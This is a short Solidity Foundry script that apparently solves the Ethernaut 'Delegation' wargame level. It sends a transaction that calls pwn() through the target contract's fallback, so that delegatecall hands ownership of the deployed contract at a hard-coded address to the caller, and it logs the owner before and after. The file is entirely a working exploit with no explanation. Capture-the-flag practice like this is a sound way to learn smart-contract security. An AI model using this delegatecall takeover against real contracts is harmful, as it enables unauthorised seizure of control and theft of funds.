// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Delegation} from "../src/06_Delegation.sol";
import {Script, console} from "forge-std/Script.sol";

contract DelegationSolve is Script {
    Delegation delegation = Delegation(0xC3fac568CFC7eaAbD9E976363351159247236737);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Owner Before#", delegation.owner());
        address(delegation).call(abi.encodeWithSignature("pwn()"));
        console.log("Owner After#", delegation.owner());

        vm.stopBroadcast();
    }
}
